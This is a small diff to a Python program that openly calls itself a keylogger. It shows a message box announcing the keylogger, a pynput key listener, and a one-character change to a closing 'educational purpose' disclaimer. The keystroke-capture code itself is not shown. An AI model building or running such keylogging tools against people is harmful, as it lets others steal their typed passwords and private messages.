@@ -90,4 +90,4 @@ def on_press(key):
 messagebox.showinfo("Keylogger", "Keylogger started. \nPress ESC to stop.")
 with Listener(on_press=on_press) as listener:
     listener.join()
-print("This program is only for the educational purpose.")
+print("\nThis program is only for the educational purpose.")
